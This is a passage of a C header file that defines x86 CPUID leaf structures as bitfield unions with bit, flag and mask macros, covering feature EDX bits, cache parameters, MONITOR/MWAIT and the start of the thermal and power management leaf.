             *
             * [Bit 13] The global bit is supported in paging-structure entries that map a page, indicating TLB entries that are common
             * to different processes and need not be flushed. The CR4.PGE bit controls this feature.
             */
            UINT32 PageGlobalBit : 1;
#define CPUID_FEATURE_INFORMATION_EDX_PAGE_GLOBAL_BIT_BIT            13
#define CPUID_FEATURE_INFORMATION_EDX_PAGE_GLOBAL_BIT_FLAG           0x2000
#define CPUID_FEATURE_INFORMATION_EDX_PAGE_GLOBAL_BIT_MASK           0x01
#define CPUID_FEATURE_INFORMATION_EDX_PAGE_GLOBAL_BIT(_)             (((_) >> 13) & 0x01)

            /**
             * @brief Machine Check Architecture
             *
             * [Bit 14] A value of 1 indicates the Machine Check Architecture of reporting machine errors is supported. The MCG_CAP MSR
             * contains feature bits describing how many banks of error reporting MSRs are supported.
             */
            UINT32 MachineCheckArchitecture : 1;
#define CPUID_FEATURE_INFORMATION_EDX_MACHINE_CHECK_ARCHITECTURE_BIT 14
#define CPUID_FEATURE_INFORMATION_EDX_MACHINE_CHECK_ARCHITECTURE_FLAG 0x4000
#define CPUID_FEATURE_INFORMATION_EDX_MACHINE_CHECK_ARCHITECTURE_MASK 0x01
#define CPUID_FEATURE_INFORMATION_EDX_MACHINE_CHECK_ARCHITECTURE(_)  (((_) >> 14) & 0x01)

            /**
             * @brief Conditional Move Instructions
             *
             * [Bit 15] The conditional move instruction CMOV is supported. In addition, if x87 FPU is present as indicated by the
             * CPUID.FPU feature bit, then the FCOMI and FCMOV instructions are supported
             */
            UINT32 ConditionalMoveInstructions : 1;
#define CPUID_FEATURE_INFORMATION_EDX_CONDITIONAL_MOVE_INSTRUCTIONS_BIT 15
#define CPUID_FEATURE_INFORMATION_EDX_CONDITIONAL_MOVE_INSTRUCTIONS_FLAG 0x8000
#define CPUID_FEATURE_INFORMATION_EDX_CONDITIONAL_MOVE_INSTRUCTIONS_MASK 0x01
#define CPUID_FEATURE_INFORMATION_EDX_CONDITIONAL_MOVE_INSTRUCTIONS(_) (((_) >> 15) & 0x01)

            /**
             * @brief Page Attribute Table
             *
             * [Bit 16] Page Attribute Table is supported. This feature augments the Memory Type Range Registers (MTRRs), allowing an
             * operating system to specify attributes of memory accessed through a linear address on a 4KB granularity.
             */
            UINT32 PageAttributeTable : 1;
#define CPUID_FEATURE_INFORMATION_EDX_PAGE_ATTRIBUTE_TABLE_BIT       16
#define CPUID_FEATURE_INFORMATION_EDX_PAGE_ATTRIBUTE_TABLE_FLAG      0x10000
#define CPUID_FEATURE_INFORMATION_EDX_PAGE_ATTRIBUTE_TABLE_MASK      0x01
#define CPUID_FEATURE_INFORMATION_EDX_PAGE_ATTRIBUTE_TABLE(_)        (((_) >> 16) & 0x01)

            /**
             * @brief 36-Bit Page Size Extension
             *
             * [Bit 17] 4-MByte pages addressing physical memory beyond 4 GBytes are supported with 32-bit paging. This feature
             * indicates that upper bits of the physical address of a 4-MByte page are encoded in bits 20:13 of the page-directory
             * entry. Such physical addresses are limited by MAXPHYADDR and may be up to 40 bits in size.
             */
            UINT32 PageSizeExtension36Bit : 1;
#define CPUID_FEATURE_INFORMATION_EDX_PAGE_SIZE_EXTENSION_36BIT_BIT  17
#define CPUID_FEATURE_INFORMATION_EDX_PAGE_SIZE_EXTENSION_36BIT_FLAG 0x20000
#define CPUID_FEATURE_INFORMATION_EDX_PAGE_SIZE_EXTENSION_36BIT_MASK 0x01
#define CPUID_FEATURE_INFORMATION_EDX_PAGE_SIZE_EXTENSION_36BIT(_)   (((_) >> 17) & 0x01)

            /**
             * @brief Processor Serial Number
             *
             * [Bit 18] The processor supports the 96-bit processor identification number feature and the feature is enabled.
             */
            UINT32 ProcessorSerialNumber : 1;
#define CPUID_FEATURE_INFORMATION_EDX_PROCESSOR_SERIAL_NUMBER_BIT    18
#define CPUID_FEATURE_INFORMATION_EDX_PROCESSOR_SERIAL_NUMBER_FLAG   0x40000
#define CPUID_FEATURE_INFORMATION_EDX_PROCESSOR_SERIAL_NUMBER_MASK   0x01
#define CPUID_FEATURE_INFORMATION_EDX_PROCESSOR_SERIAL_NUMBER(_)     (((_) >> 18) & 0x01)

            /**
             * @brief CLFLUSH Instruction
             *
             * [Bit 19] CLFLUSH Instruction is supported.
             */
            UINT32 Clflush : 1;
#define CPUID_FEATURE_INFORMATION_EDX_CLFLUSH_BIT                    19
#define CPUID_FEATURE_INFORMATION_EDX_CLFLUSH_FLAG                   0x80000
#define CPUID_FEATURE_INFORMATION_EDX_CLFLUSH_MASK                   0x01
#define CPUID_FEATURE_INFORMATION_EDX_CLFLUSH(_)                     (((_) >> 19) & 0x01)
            UINT32 Reserved2 : 1;

            /**
             * @brief Debug Store
             *
             * [Bit 21] The processor supports the ability to write debug information into a memory resident buffer. This feature is
             * used by the branch trace store (BTS) and processor event-based sampling (PEBS) facilities.
             *
             * @see Vol3C[23(INTRODUCTION TO VIRTUAL MACHINE EXTENSIONS)]
             */
            UINT32 DebugStore : 1;
#define CPUID_FEATURE_INFORMATION_EDX_DEBUG_STORE_BIT                21
#define CPUID_FEATURE_INFORMATION_EDX_DEBUG_STORE_FLAG               0x200000
#define CPUID_FEATURE_INFORMATION_EDX_DEBUG_STORE_MASK               0x01
#define CPUID_FEATURE_INFORMATION_EDX_DEBUG_STORE(_)                 (((_) >> 21) & 0x01)

            /**
             * @brief Thermal Monitor and Software Controlled Clock Facilities
             *
             * [Bit 22] The processor implements internal MSRs that allow processor temperature to be monitored and processor
             * performance to be modulated in predefined duty cycles under software control.
             */
            UINT32 ThermalControlMsrsForAcpi : 1;
#define CPUID_FEATURE_INFORMATION_EDX_THERMAL_CONTROL_MSRS_FOR_ACPI_BIT 22
#define CPUID_FEATURE_INFORMATION_EDX_THERMAL_CONTROL_MSRS_FOR_ACPI_FLAG 0x400000
#define CPUID_FEATURE_INFORMATION_EDX_THERMAL_CONTROL_MSRS_FOR_ACPI_MASK 0x01
#define CPUID_FEATURE_INFORMATION_EDX_THERMAL_CONTROL_MSRS_FOR_ACPI(_) (((_) >> 22) & 0x01)

            /**
             * @brief Intel MMX Technology
             *
             * [Bit 23] The processor supports the Intel MMX technology.
             */
            UINT32 MmxSupport : 1;
#define CPUID_FEATURE_INFORMATION_EDX_MMX_SUPPORT_BIT                23
#define CPUID_FEATURE_INFORMATION_EDX_MMX_SUPPORT_FLAG               0x800000
#define CPUID_FEATURE_INFORMATION_EDX_MMX_SUPPORT_MASK               0x01
#define CPUID_FEATURE_INFORMATION_EDX_MMX_SUPPORT(_)                 (((_) >> 23) & 0x01)

            /**
             * @brief FXSAVE and FXRSTOR Instructions
             *
             * [Bit 24] The FXSAVE and FXRSTOR instructions are supported for fast save and restore of the floating point context.
             * Presence of this bit also indicates that CR4.OSFXSR is available for an operating system to indicate that it supports
             * the FXSAVE and FXRSTOR instructions.
             */
            UINT32 FxsaveFxrstorInstructions : 1;
#define CPUID_FEATURE_INFORMATION_EDX_FXSAVE_FXRSTOR_INSTRUCTIONS_BIT 24
#define CPUID_FEATURE_INFORMATION_EDX_FXSAVE_FXRSTOR_INSTRUCTIONS_FLAG 0x1000000
#define CPUID_FEATURE_INFORMATION_EDX_FXSAVE_FXRSTOR_INSTRUCTIONS_MASK 0x01
#define CPUID_FEATURE_INFORMATION_EDX_FXSAVE_FXRSTOR_INSTRUCTIONS(_) (((_) >> 24) & 0x01)

            /**
             * @brief SSE extensions support
             *
             * [Bit 25] The processor supports the SSE extensions.
             */
            UINT32 SseSupport : 1;
#define CPUID_FEATURE_INFORMATION_EDX_SSE_SUPPORT_BIT                25
#define CPUID_FEATURE_INFORMATION_EDX_SSE_SUPPORT_FLAG               0x2000000
#define CPUID_FEATURE_INFORMATION_EDX_SSE_SUPPORT_MASK               0x01
#define CPUID_FEATURE_INFORMATION_EDX_SSE_SUPPORT(_)                 (((_) >> 25) & 0x01)

            /**
             * @brief SSE2 extensions support
             *
             * [Bit 26] The processor supports the SSE2 extensions.
             */
            UINT32 Sse2Support : 1;
#define CPUID_FEATURE_INFORMATION_EDX_SSE2_SUPPORT_BIT               26
#define CPUID_FEATURE_INFORMATION_EDX_SSE2_SUPPORT_FLAG              0x4000000
#define CPUID_FEATURE_INFORMATION_EDX_SSE2_SUPPORT_MASK              0x01
#define CPUID_FEATURE_INFORMATION_EDX_SSE2_SUPPORT(_)                (((_) >> 26) & 0x01)

            /**
             * @brief Self Snoop
             *
             * [Bit 27] The processor supports the management of conflicting memory types by performing a snoop of its own cache
             * structure for transactions issued to the bus.
             */
            UINT32 SelfSnoop : 1;
#define CPUID_FEATURE_INFORMATION_EDX_SELF_SNOOP_BIT                 27
#define CPUID_FEATURE_INFORMATION_EDX_SELF_SNOOP_FLAG                0x8000000
#define CPUID_FEATURE_INFORMATION_EDX_SELF_SNOOP_MASK                0x01
#define CPUID_FEATURE_INFORMATION_EDX_SELF_SNOOP(_)                  (((_) >> 27) & 0x01)

            /**
             * @brief Max APIC IDs reserved field is Valid
             *
             * [Bit 28] A value of 0 for HTT indicates there is only a single logical processor in the package and software should
             * assume only a single APIC ID is reserved. A value of 1 for HTT indicates the value in CPUID.1.EBX[23:16] (the Maximum
             * number of addressable IDs for logical processors in this package) is valid for the package.
             */
            UINT32 HyperThreadingTechnology : 1;
#define CPUID_FEATURE_INFORMATION_EDX_HYPER_THREADING_TECHNOLOGY_BIT 28
#define CPUID_FEATURE_INFORMATION_EDX_HYPER_THREADING_TECHNOLOGY_FLAG 0x10000000
#define CPUID_FEATURE_INFORMATION_EDX_HYPER_THREADING_TECHNOLOGY_MASK 0x01
#define CPUID_FEATURE_INFORMATION_EDX_HYPER_THREADING_TECHNOLOGY(_)  (((_) >> 28) & 0x01)

            /**
             * @brief Thermal Monitor
             *
             * [Bit 29] The processor implements the thermal monitor automatic thermal control circuitry (TCC).
             */
            UINT32 ThermalMonitor : 1;
#define CPUID_FEATURE_INFORMATION_EDX_THERMAL_MONITOR_BIT            29
#define CPUID_FEATURE_INFORMATION_EDX_THERMAL_MONITOR_FLAG           0x20000000
#define CPUID_FEATURE_INFORMATION_EDX_THERMAL_MONITOR_MASK           0x01
#define CPUID_FEATURE_INFORMATION_EDX_THERMAL_MONITOR(_)             (((_) >> 29) & 0x01)
            UINT32 Reserved3 : 1;

            /**
             * @brief Pending Break Enable
             *
             * [Bit 31] The processor supports the use of the FERR\#/PBE\# pin when the processor is in the stop-clock state (STPCLK\#
             * is asserted) to signal the processor that an interrupt is pending and that the processor should return to normal
             * operation to handle the interrupt. Bit 10 (PBE enable) in the IA32_MISC_ENABLE MSR enables this capability.
             */
            UINT32 PendingBreakEnable : 1;
#define CPUID_FEATURE_INFORMATION_EDX_PENDING_BREAK_ENABLE_BIT       31
#define CPUID_FEATURE_INFORMATION_EDX_PENDING_BREAK_ENABLE_FLAG      0x80000000
#define CPUID_FEATURE_INFORMATION_EDX_PENDING_BREAK_ENABLE_MASK      0x01
#define CPUID_FEATURE_INFORMATION_EDX_PENDING_BREAK_ENABLE(_)        (((_) >> 31) & 0x01)
        };

        UINT32 Flags;
    } CpuidFeatureInformationEdx;

} CPUID_EAX_01;


/**
 * @brief Deterministic Cache Parameters Leaf
 *
 * When CPUID executes with EAX set to 04H and ECX contains an index value, the processor returns encoded data that
 * describe a set of deterministic cache parameters (for the cache level associated with the input in ECX). Valid index
 * values start from 0.
 * Software can enumerate the deterministic cache parameters for each level of the cache hierarchy starting with an index
 * value of 0, until the parameters report the value associated with the cache type field is 0. The architecturally defined
 * fields reported by deterministic cache parameters are documented in Table 3-8.
 * This Cache Size in Bytes
 * - = (Ways + 1) * (Partitions + 1) * (Line_Size + 1) * (Sets + 1)
 * - = (EBX[31:22] + 1) * (EBX[21:12] + 1) * (EBX[11:0] + 1) * (ECX + 1)
 * The CPUID leaf 04H also reports data that can be used to derive the topology of processor cores in a physical package.
 * This information is constant for all valid index values. Software can query the raw data reported by executing CPUID
 * with EAX=04H and ECX=0 and use it as part of the topology enumeration algorithm.
 *
 * @see Vol3A[8(Multiple-Processor Management)]
 */
#define CPUID_CACHE_PARAMETERS                                       0x00000004
typedef struct
{
    union
    {
        struct
        {
            /**
             * [Bits 4:0] - 0 = Null - No more caches.
             * - 1 = Data Cache.
             * - 2 = Instruction Cache.
             * - 3 = Unified Cache.
             * - 4-31 = Reserved.
             */
            UINT32 CacheTypeField : 5;
#define CPUID_EAX_CACHE_TYPE_FIELD_BIT                               0
#define CPUID_EAX_CACHE_TYPE_FIELD_FLAG                              0x1F
#define CPUID_EAX_CACHE_TYPE_FIELD_MASK                              0x1F
#define CPUID_EAX_CACHE_TYPE_FIELD(_)                                (((_) >> 0) & 0x1F)

            /**
             * [Bits 7:5] Cache Level (starts at 1).
             */
            UINT32 CacheLevel : 3;
#define CPUID_EAX_CACHE_LEVEL_BIT                                    5
#define CPUID_EAX_CACHE_LEVEL_FLAG                                   0xE0
#define CPUID_EAX_CACHE_LEVEL_MASK                                   0x07
#define CPUID_EAX_CACHE_LEVEL(_)                                     (((_) >> 5) & 0x07)

            /**
             * [Bit 8] Self Initializing cache level (does not need SW initialization).
             */
            UINT32 SelfInitializingCacheLevel : 1;
#define CPUID_EAX_SELF_INITIALIZING_CACHE_LEVEL_BIT                  8
#define CPUID_EAX_SELF_INITIALIZING_CACHE_LEVEL_FLAG                 0x100
#define CPUID_EAX_SELF_INITIALIZING_CACHE_LEVEL_MASK                 0x01
#define CPUID_EAX_SELF_INITIALIZING_CACHE_LEVEL(_)                   (((_) >> 8) & 0x01)

            /**
             * [Bit 9] Fully Associative cache.
             */
            UINT32 FullyAssociativeCache : 1;
#define CPUID_EAX_FULLY_ASSOCIATIVE_CACHE_BIT                        9
#define CPUID_EAX_FULLY_ASSOCIATIVE_CACHE_FLAG                       0x200
#define CPUID_EAX_FULLY_ASSOCIATIVE_CACHE_MASK                       0x01
#define CPUID_EAX_FULLY_ASSOCIATIVE_CACHE(_)                         (((_) >> 9) & 0x01)
            UINT32 Reserved1 : 4;

            /**
             * [Bits 25:14] Maximum number of addressable IDs for logical processors sharing this cache.
             *
             * @note Add one to the return value to get the result.
             *       The nearest power-of-2 integer that is not smaller than (1 + EAX[25:14]) is the number of unique initial APIC IDs
             *       reserved for addressing different logical processors sharing this cache.
             */
            UINT32 MaxAddressableIdsForLogicalProcessorsSharingThisCache : 12;
#define CPUID_EAX_MAX_ADDRESSABLE_IDS_FOR_LOGICAL_PROCESSORS_SHARING_THIS_CACHE_BIT 14
#define CPUID_EAX_MAX_ADDRESSABLE_IDS_FOR_LOGICAL_PROCESSORS_SHARING_THIS_CACHE_FLAG 0x3FFC000
#define CPUID_EAX_MAX_ADDRESSABLE_IDS_FOR_LOGICAL_PROCESSORS_SHARING_THIS_CACHE_MASK 0xFFF
#define CPUID_EAX_MAX_ADDRESSABLE_IDS_FOR_LOGICAL_PROCESSORS_SHARING_THIS_CACHE(_) (((_) >> 14) & 0xFFF)

            /**
             * [Bits 31:26] Maximum number of addressable IDs for processor cores in the physical package.
             *
             * @note Add one to the return value to get the result.
             *       The nearest power-of-2 integer that is not smaller than (1 + EAX[31:26]) is the number of unique Core_IDs reserved for
             *       addressing different processor cores in a physical package. Core ID is a subset of bits of the initial APIC ID.
             *       The returned value is constant for valid initial values in ECX. Valid ECX values start from 0.
             */
            UINT32 MaxAddressableIdsForProcessorCoresInPhysicalPackage : 6;
#define CPUID_EAX_MAX_ADDRESSABLE_IDS_FOR_PROCESSOR_CORES_IN_PHYSICAL_PACKAGE_BIT 26
#define CPUID_EAX_MAX_ADDRESSABLE_IDS_FOR_PROCESSOR_CORES_IN_PHYSICAL_PACKAGE_FLAG 0xFC000000
#define CPUID_EAX_MAX_ADDRESSABLE_IDS_FOR_PROCESSOR_CORES_IN_PHYSICAL_PACKAGE_MASK 0x3F
#define CPUID_EAX_MAX_ADDRESSABLE_IDS_FOR_PROCESSOR_CORES_IN_PHYSICAL_PACKAGE(_) (((_) >> 26) & 0x3F)
        };

        UINT32 Flags;
    } Eax;

    union
    {
        struct
        {
            /**
             * [Bits 11:0] System Coherency Line Size.
             *
             * @note Add one to the return value to get the result.
             */
            UINT32 SystemCoherencyLineSize : 12;
#define CPUID_EBX_SYSTEM_COHERENCY_LINE_SIZE_BIT                     0
#define CPUID_EBX_SYSTEM_COHERENCY_LINE_SIZE_FLAG                    0xFFF
#define CPUID_EBX_SYSTEM_COHERENCY_LINE_SIZE_MASK                    0xFFF
#define CPUID_EBX_SYSTEM_COHERENCY_LINE_SIZE(_)                      (((_) >> 0) & 0xFFF)

            /**
             * [Bits 21:12] Physical Line partitions.
             *
             * @note Add one to the return value to get the result.
             */
            UINT32 PhysicalLinePartitions : 10;
#define CPUID_EBX_PHYSICAL_LINE_PARTITIONS_BIT                       12
#define CPUID_EBX_PHYSICAL_LINE_PARTITIONS_FLAG                      0x3FF000
#define CPUID_EBX_PHYSICAL_LINE_PARTITIONS_MASK                      0x3FF
#define CPUID_EBX_PHYSICAL_LINE_PARTITIONS(_)                        (((_) >> 12) & 0x3FF)

            /**
             * [Bits 31:22] Ways of associativity.
             *
             * @note Add one to the return value to get the result.
             */
            UINT32 WaysOfAssociativity : 10;
#define CPUID_EBX_WAYS_OF_ASSOCIATIVITY_BIT                          22
#define CPUID_EBX_WAYS_OF_ASSOCIATIVITY_FLAG                         0xFFC00000
#define CPUID_EBX_WAYS_OF_ASSOCIATIVITY_MASK                         0x3FF
#define CPUID_EBX_WAYS_OF_ASSOCIATIVITY(_)                           (((_) >> 22) & 0x3FF)
        };

        UINT32 Flags;
    } Ebx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] Number of Sets.
             *
             * @note Add one to the return value to get the result.
             */
            UINT32 NumberOfSets : 32;
#define CPUID_ECX_NUMBER_OF_SETS_BIT                                 0
#define CPUID_ECX_NUMBER_OF_SETS_FLAG                                0xFFFFFFFF
#define CPUID_ECX_NUMBER_OF_SETS_MASK                                0xFFFFFFFF
#define CPUID_ECX_NUMBER_OF_SETS(_)                                  (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ecx;

    union
    {
        struct
        {
            /**
             * @brief Write-Back Invalidate/Invalidate
             *
             * [Bit 0] - 0 = WBINVD/INVD from threads sharing this cache acts upon lower level caches for threads sharing this cache.
             * - 1 = WBINVD/INVD is not guaranteed to act upon lower level caches of non-originating threads sharing this cache.
             */
            UINT32 WriteBackInvalidate : 1;
#define CPUID_EDX_WRITE_BACK_INVALIDATE_BIT                          0
#define CPUID_EDX_WRITE_BACK_INVALIDATE_FLAG                         0x01
#define CPUID_EDX_WRITE_BACK_INVALIDATE_MASK                         0x01
#define CPUID_EDX_WRITE_BACK_INVALIDATE(_)                           (((_) >> 0) & 0x01)

            /**
             * @brief Cache Inclusiveness
             *
             * [Bit 1] - 0 = Cache is not inclusive of lower cache levels.
             * - 1 = Cache is inclusive of lower cache levels.
             */
            UINT32 CacheInclusiveness : 1;
#define CPUID_EDX_CACHE_INCLUSIVENESS_BIT                            1
#define CPUID_EDX_CACHE_INCLUSIVENESS_FLAG                           0x02
#define CPUID_EDX_CACHE_INCLUSIVENESS_MASK                           0x01
#define CPUID_EDX_CACHE_INCLUSIVENESS(_)                             (((_) >> 1) & 0x01)

            /**
             * @brief Complex Cache Indexing
             *
             * [Bit 2] - 0 = Direct mapped cache.
             * - 1 = A complex function is used to index the cache, potentially using all address bits.
             */
            UINT32 ComplexCacheIndexing : 1;
#define CPUID_EDX_COMPLEX_CACHE_INDEXING_BIT                         2
#define CPUID_EDX_COMPLEX_CACHE_INDEXING_FLAG                        0x04
#define CPUID_EDX_COMPLEX_CACHE_INDEXING_MASK                        0x01
#define CPUID_EDX_COMPLEX_CACHE_INDEXING(_)                          (((_) >> 2) & 0x01)
            UINT32 Reserved1 : 29;
        };

        UINT32 Flags;
    } Edx;

} CPUID_EAX_04;


/**
 * @brief MONITOR/MWAIT Leaf
 *
 * When CPUID executes with EAX set to 05H, the processor returns information about features available to MONITOR/MWAIT
 * instructions. The MONITOR instruction is used for address-range monitoring in conjunction with MWAIT instruction. The
 * MWAIT instruction optionally provides additional extensions for advanced power management.
 */
#define CPUID_MONITOR_MWAIT                                          0x00000005
typedef struct
{
    union
    {
        struct
        {
            /**
             * [Bits 15:0] Smallest monitor-line size in bytes (default is processor's monitor granularity).
             */
            UINT32 SmallestMonitorLineSize : 16;
#define CPUID_EAX_SMALLEST_MONITOR_LINE_SIZE_BIT                     0
#define CPUID_EAX_SMALLEST_MONITOR_LINE_SIZE_FLAG                    0xFFFF
#define CPUID_EAX_SMALLEST_MONITOR_LINE_SIZE_MASK                    0xFFFF
#define CPUID_EAX_SMALLEST_MONITOR_LINE_SIZE(_)                      (((_) >> 0) & 0xFFFF)
            UINT32 Reserved1 : 16;
        };

        UINT32 Flags;
    } Eax;

    union
    {
        struct
        {
            /**
             * [Bits 15:0] Largest monitor-line size in bytes (default is processor's monitor granularity).
             */
            UINT32 LargestMonitorLineSize : 16;
#define CPUID_EBX_LARGEST_MONITOR_LINE_SIZE_BIT                      0
#define CPUID_EBX_LARGEST_MONITOR_LINE_SIZE_FLAG                     0xFFFF
#define CPUID_EBX_LARGEST_MONITOR_LINE_SIZE_MASK                     0xFFFF
#define CPUID_EBX_LARGEST_MONITOR_LINE_SIZE(_)                       (((_) >> 0) & 0xFFFF)
            UINT32 Reserved1 : 16;
        };

        UINT32 Flags;
    } Ebx;

    union
    {
        struct
        {
            /**
             * [Bit 0] Enumeration of Monitor-Mwait extensions (beyond EAX and EBX registers) supported.
             */
            UINT32 EnumerationOfMonitorMwaitExtensions : 1;
#define CPUID_ECX_ENUMERATION_OF_MONITOR_MWAIT_EXTENSIONS_BIT        0
#define CPUID_ECX_ENUMERATION_OF_MONITOR_MWAIT_EXTENSIONS_FLAG       0x01
#define CPUID_ECX_ENUMERATION_OF_MONITOR_MWAIT_EXTENSIONS_MASK       0x01
#define CPUID_ECX_ENUMERATION_OF_MONITOR_MWAIT_EXTENSIONS(_)         (((_) >> 0) & 0x01)

            /**
             * [Bit 1] Supports treating interrupts as break-event for MWAIT, even when interrupts disabled.
             */
            UINT32 SupportsTreatingInterruptsAsBreakEventForMwait : 1;
#define CPUID_ECX_SUPPORTS_TREATING_INTERRUPTS_AS_BREAK_EVENT_FOR_MWAIT_BIT 1
#define CPUID_ECX_SUPPORTS_TREATING_INTERRUPTS_AS_BREAK_EVENT_FOR_MWAIT_FLAG 0x02
#define CPUID_ECX_SUPPORTS_TREATING_INTERRUPTS_AS_BREAK_EVENT_FOR_MWAIT_MASK 0x01
#define CPUID_ECX_SUPPORTS_TREATING_INTERRUPTS_AS_BREAK_EVENT_FOR_MWAIT(_) (((_) >> 1) & 0x01)
            UINT32 Reserved1 : 30;
        };

        UINT32 Flags;
    } Ecx;

    union
    {
        struct
        {
            /**
             * [Bits 3:0] Number of C0 sub C-states supported using MWAIT.
             */
            UINT32 NumberOfC0SubCStates : 4;
#define CPUID_EDX_NUMBER_OF_C0_SUB_C_STATES_BIT                      0
#define CPUID_EDX_NUMBER_OF_C0_SUB_C_STATES_FLAG                     0x0F
#define CPUID_EDX_NUMBER_OF_C0_SUB_C_STATES_MASK                     0x0F
#define CPUID_EDX_NUMBER_OF_C0_SUB_C_STATES(_)                       (((_) >> 0) & 0x0F)

            /**
             * [Bits 7:4] Number of C1 sub C-states supported using MWAIT.
             */
            UINT32 NumberOfC1SubCStates : 4;
#define CPUID_EDX_NUMBER_OF_C1_SUB_C_STATES_BIT                      4
#define CPUID_EDX_NUMBER_OF_C1_SUB_C_STATES_FLAG                     0xF0
#define CPUID_EDX_NUMBER_OF_C1_SUB_C_STATES_MASK                     0x0F
#define CPUID_EDX_NUMBER_OF_C1_SUB_C_STATES(_)                       (((_) >> 4) & 0x0F)

            /**
             * [Bits 11:8] Number of C2 sub C-states supported using MWAIT.
             */
            UINT32 NumberOfC2SubCStates : 4;
#define CPUID_EDX_NUMBER_OF_C2_SUB_C_STATES_BIT                      8
#define CPUID_EDX_NUMBER_OF_C2_SUB_C_STATES_FLAG                     0xF00
#define CPUID_EDX_NUMBER_OF_C2_SUB_C_STATES_MASK                     0x0F
#define CPUID_EDX_NUMBER_OF_C2_SUB_C_STATES(_)                       (((_) >> 8) & 0x0F)

            /**
             * [Bits 15:12] Number of C3 sub C-states supported using MWAIT.
             */
            UINT32 NumberOfC3SubCStates : 4;
#define CPUID_EDX_NUMBER_OF_C3_SUB_C_STATES_BIT                      12
#define CPUID_EDX_NUMBER_OF_C3_SUB_C_STATES_FLAG                     0xF000
#define CPUID_EDX_NUMBER_OF_C3_SUB_C_STATES_MASK                     0x0F
#define CPUID_EDX_NUMBER_OF_C3_SUB_C_STATES(_)                       (((_) >> 12) & 0x0F)

            /**
             * [Bits 19:16] Number of C4 sub C-states supported using MWAIT.
             */
            UINT32 NumberOfC4SubCStates : 4;
#define CPUID_EDX_NUMBER_OF_C4_SUB_C_STATES_BIT                      16
#define CPUID_EDX_NUMBER_OF_C4_SUB_C_STATES_FLAG                     0xF0000
#define CPUID_EDX_NUMBER_OF_C4_SUB_C_STATES_MASK                     0x0F
#define CPUID_EDX_NUMBER_OF_C4_SUB_C_STATES(_)                       (((_) >> 16) & 0x0F)

            /**
             * [Bits 23:20] Number of C5 sub C-states supported using MWAIT.
             */
            UINT32 NumberOfC5SubCStates : 4;
#define CPUID_EDX_NUMBER_OF_C5_SUB_C_STATES_BIT                      20
#define CPUID_EDX_NUMBER_OF_C5_SUB_C_STATES_FLAG                     0xF00000
#define CPUID_EDX_NUMBER_OF_C5_SUB_C_STATES_MASK                     0x0F
#define CPUID_EDX_NUMBER_OF_C5_SUB_C_STATES(_)                       (((_) >> 20) & 0x0F)

            /**
             * [Bits 27:24] Number of C6 sub C-states supported using MWAIT.
             */
            UINT32 NumberOfC6SubCStates : 4;
#define CPUID_EDX_NUMBER_OF_C6_SUB_C_STATES_BIT                      24
#define CPUID_EDX_NUMBER_OF_C6_SUB_C_STATES_FLAG                     0xF000000
#define CPUID_EDX_NUMBER_OF_C6_SUB_C_STATES_MASK                     0x0F
#define CPUID_EDX_NUMBER_OF_C6_SUB_C_STATES(_)                       (((_) >> 24) & 0x0F)

            /**
             * [Bits 31:28] Number of C7 sub C-states supported using MWAIT.
             */
            UINT32 NumberOfC7SubCStates : 4;
#define CPUID_EDX_NUMBER_OF_C7_SUB_C_STATES_BIT                      28
#define CPUID_EDX_NUMBER_OF_C7_SUB_C_STATES_FLAG                     0xF0000000
#define CPUID_EDX_NUMBER_OF_C7_SUB_C_STATES_MASK                     0x0F
#define CPUID_EDX_NUMBER_OF_C7_SUB_C_STATES(_)                       (((_) >> 28) & 0x0F)
        };

        UINT32 Flags;
    } Edx;

} CPUID_EAX_05;


/**
 * @brief Thermal and Power Management Leaf
 *
 * When CPUID executes with EAX set to 06H, the processor returns information about thermal and power management features.
 */
#define CPUID_THERMAL_AND_POWER_MANAGEMENT                           0x00000006
typedef struct
{
    union
    {
        struct
        {
            /**
             * [Bit 0] Digital temperature sensor is supported if set.
             */
            UINT32 TemperatureSensorSupported : 1;
#define CPUID_EAX_TEMPERATURE_SENSOR_SUPPORTED_BIT                   0
#define CPUID_EAX_TEMPERATURE_SENSOR_SUPPORTED_FLAG                  0x01
#define CPUID_EAX_TEMPERATURE_SENSOR_SUPPORTED_MASK                  0x01
#define CPUID_EAX_TEMPERATURE_SENSOR_SUPPORTED(_)                    (((_) >> 0) & 0x01)

            /**
             * [Bit 1] Intel Turbo Boost Technology available (see description of IA32_MISC_ENABLE[38]).
             */
            UINT32 IntelTurboBoostTechnologyAvailable : 1;
#define CPUID_EAX_INTEL_TURBO_BOOST_TECHNOLOGY_AVAILABLE_BIT         1
#define CPUID_EAX_INTEL_TURBO_BOOST_TECHNOLOGY_AVAILABLE_FLAG        0x02
#define CPUID_EAX_INTEL_TURBO_BOOST_TECHNOLOGY_AVAILABLE_MASK        0x01
#define CPUID_EAX_INTEL_TURBO_BOOST_TECHNOLOGY_AVAILABLE(_)          (((_) >> 1) & 0x01)

            /**
             * [Bit 2] ARAT. APIC-Timer-always-running feature is supported if set.
             */
            UINT32 ApicTimerAlwaysRunning : 1;
#define CPUID_EAX_APIC_TIMER_ALWAYS_RUNNING_BIT                      2
#define CPUID_EAX_APIC_TIMER_ALWAYS_RUNNING_FLAG                     0x04
#define CPUID_EAX_APIC_TIMER_ALWAYS_RUNNING_MASK                     0x01
#define CPUID_EAX_APIC_TIMER_ALWAYS_RUNNING(_)                       (((_) >> 2) & 0x01)
            UINT32 Reserved1 : 1;

            /**
             * [Bit 4] PLN. Power limit notification controls are supported if set.
             */
            UINT32 PowerLimitNotification : 1;
#define CPUID_EAX_POWER_LIMIT_NOTIFICATION_BIT                       4
#define CPUID_EAX_POWER_LIMIT_NOTIFICATION_FLAG                      0x10
#define CPUID_EAX_POWER_LIMIT_NOTIFICATION_MASK                      0x01
#define CPUID_EAX_POWER_LIMIT_NOTIFICATION(_)                        (((_) >> 4) & 0x01)

            /**
             * [Bit 5] ECMD. Clock modulation duty cycle extension is supported if set.
             */
            UINT32 ClockModulationDuty : 1;
#define CPUID_EAX_CLOCK_MODULATION_DUTY_BIT                          5
#define CPUID_EAX_CLOCK_MODULATION_DUTY_FLAG                         0x20
#define CPUID_EAX_CLOCK_MODULATION_DUTY_MASK                         0x01
#define CPUID_EAX_CLOCK_MODULATION_DUTY(_)                           (((_) >> 5) & 0x01)

            /**
             * [Bit 6] PTM. Package thermal management is supported if set.
             */
            UINT32 PackageThermalManagement : 1;
#define CPUID_EAX_PACKAGE_THERMAL_MANAGEMENT_BIT                     6
#define CPUID_EAX_PACKAGE_THERMAL_MANAGEMENT_FLAG                    0x40
#define CPUID_EAX_PACKAGE_THERMAL_MANAGEMENT_MASK                    0x01
